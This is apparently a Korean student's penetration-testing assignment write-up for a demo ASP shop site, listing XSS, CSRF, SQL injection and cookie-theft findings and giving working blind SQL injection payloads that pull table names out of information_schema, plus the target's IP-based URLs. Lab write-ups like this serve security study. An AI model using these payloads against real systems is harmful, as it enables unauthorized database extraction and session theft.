# Penetration-Testing1

과제1) 모든 취약점 찾기
1. Quick Search창에서의 XSS 취약점
<script>alert("xss")</script>를 대입하였을때 동작함.
![image](https://user-images.githubusercontent.com/82012857/176285510-f6908bb4-5a26-4577-a64b-77c077e90c5c.png)

2. Board에서의 CSRF 취약점
1번과 마찬가지로 HTML로 글 작성시 XSS에 반응하여 CSRF 취약점이 있다는 것을 알 수 있음.
![image](https://user-images.githubusercontent.com/82012857/176285525-016dce9f-44fa-4034-bc10-b012649fceb3.png)

3. 입력창에서의 SQL injection
거의 모든 입력창에 대해서 비정상적인 SQL구문에 대해서 답을 함 
![image](https://user-images.githubusercontent.com/82012857/176285549-6b1343a9-c8ba-42c1-869b-b8a75733aae4.png)

4. 쿠키값 탈취로 사용자 세션 하이재킹(?)
![image](https://user-images.githubusercontent.com/82012857/176285565-aaab7a95-8eba-4f7a-b0ce-372202f42513.png)

과제2) information_schema.table를 활용해서 첫번째 테이블과 두번째 테이블 이름 찾기(검색이 필요)

1. 주소찾기에서 blind SQL injection을 통해 한글자씩 검색한 결과 첫번째 테이블은 9글자의 order_man이라는 결과를 얻었다.

SQL 구문
' or substring((select top 1 table_name  from information_schema.tables),1,1) = 'o' --
' or (select top 1 LEN(table_name)  from information_schema.tables) = 9 --
' or (select top 1 table_name  from information_schema.tables) = 'order_man' -- 

첫번째 테이블 답: order_man

2. 첫번째 테이블인 order_man을 where문에 not in하여 top1을 하면 두번째 테이블에 대해 검색할 수 있다. 그 후 첫번째 테이블과 동일한 방식으로 검색한 결과 5글자의 paper이라는 결과를 얻었다.

SQL 구문
' or substring((select top 1 table_name  from information_schema.tables where table_name not in ('order_man')),1,1) = 'p' --
p q r s t 
' or (select top 1 LEN(table_name)  from information_schema.tables where table_name not in ('order_man')) = 5 --
' or (select top 1 table_name  from information_schema.tables where table_name not in ('order_man')) = 'paper' -- 

두번째 테이블 답: paper

http://61.39.155.24:50003/demoshop/shop/shop_main.asp
http://61.39.155.24:50003/demoshop/login/findNewaddr.asp
